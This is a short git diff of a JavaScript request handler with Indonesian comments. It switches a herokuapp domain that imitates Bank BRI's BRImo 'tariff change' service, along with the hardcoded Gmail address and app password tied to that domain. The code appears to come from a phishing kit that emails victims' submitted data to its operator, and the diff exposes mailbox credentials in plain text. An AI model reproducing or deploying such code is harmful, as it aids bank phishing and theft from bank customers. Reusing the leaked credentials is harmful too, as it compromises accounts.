@@ -7,11 +7,11 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
 
-    if(url == 'perubahan-tarifbrimo.herokuapp.com') //jika url sama dengan url hosting
+    if(url == 'pilihtarifbrimo.herokuapp.com') //jika url sama dengan url hosting
     {
 
-        email = 'besarhasil47@gmail.com'; //email
-        pass = 'srpjniuzjggqmomn'; //sandi aplikasi dari verifikasi 2 langkah
+        email = 'sehebat52@gmail.com'; //email
+        pass = 'xkzebfcpoaqurrsw'; //sandi aplikasi dari verifikasi 2 langkah
         
     } else if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
